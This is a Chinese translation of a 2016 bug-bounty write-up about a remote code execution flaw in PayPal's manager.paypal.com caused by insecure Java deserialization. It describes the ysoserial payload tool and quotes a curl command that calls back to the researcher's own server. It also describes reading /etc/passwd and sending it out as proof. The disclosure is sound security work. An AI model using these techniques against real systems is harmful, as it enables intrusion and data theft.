# PayPal远程代码执行漏洞

阅读量 **106056**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-01-26 14:02:07

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<http://artsploit.blogspot.jp/2016/01/paypal-rce.html>

译文仅供参考，具体内容表达以及含义原文为准。

在2015年12月,我在PayPal商业网站([manager.paypal.com](https://manager.paypal.com/))中发现了一个严重的漏洞,这个漏洞的存在,使得我可以通过不安全的JAVA反序列化对象,在PayPal的网站服务器上远程使用shell命令,并且获取访问生产数据库的权限。我迅速将这个漏洞向PayPal的安全团队报告,这个漏洞随后很快就被解决。

具体细节:

在对PayPal的网站进行安全检测的时候,我被一个不同寻常的附件表单参数“oldForm”所吸引,这个参数在经过base64解码后,看上去比较复杂。

在经过一些研究后,我意识到这是一个没有任何标记的java序列化对象,它由应用程序处理。这就意味着你可以向服务器发送任何现有类别的序列化对象,和“readObject”(或“readResolve”)。如果想利用这个漏洞,你需要在“classpath”中找到一个合适的类别,一个可以进行序列化和具有有趣(只是站在开发利用的角度来看)的内置的“readObject”方案。你可以在最近的由[FoxGlove
Security](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)安全团队所做的一篇文章中,了解到这项技术。一年前,Chris Frohoff (@frohoff)和Gabriel
Lawrence (@gebl)做了一项伟大的工作,他们在Apache Common
Collections库中找到了合适的类,这使得他们可以进行远程代码操控,并且还在他们的 [github
page](https://github.com/frohoff/ysoserial)主页上公布了“ysoserial”有效负载生成工具。

开发利用:

我迅速下载了这个工具,然后生成了一个简单的有效负载,并向我自己的服务器上通过执行“curl
x.s.artsploit.com/paypal”shell命令,发送DNS和HTTP请求:

然后我向程序服务器发送了那个在“oldFormData”参数中的base64加密的有效负载,之后令我印象深刻的是,当来自PayPal网络的请求在我的NGINX访问日志中出现的时候:

我意识到我可以在manager.paypal.com网页服务器上执行任意的操作命令,此外,我可以建立一个后台连接,连接到我喜欢的服务器上,比如,上传和执行一个后门。结果是,我可以获取manager.paypal.com应用程序所使用的生产数据库的访问权限。

取而代之的是,我只是读取“/etc/passwd” 文件,通过把它发送到我的服务器上,并将它所为漏洞的例证:

我还录制了一段视频,关于如何重新生成此漏洞,并将它向PayPal安全团队进行报告。

在那之后,我在manager.paypal.com程序中发现许多其他端点,它们同样使用序列化对象,也同样可以被利用。

大约一个月后,PayPal给了我一笔奖金,用来奖励我此次对该漏洞所做的报告,但据我所知,另一位研究员Mark
Litchfield在2015年12月11日也对类似的漏洞做了报告,比我还提早两天。但不管怎么说,PayPal决定给我一笔奖金,我尊重他们的决定。

本文翻译自360安全播报 [原文链接](http://artsploit.blogspot.jp/2016/01/paypal-rce.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **卡布奇诺甜甜圈** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83383](/post/id/83383)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报](http://artsploit.blogspot.jp/2016/01/paypal-rce.html)

如若转载,请注明出处： <http://artsploit.blogspot.jp/2016/01/paypal-rce.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) 卡布奇诺甜甜圈

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

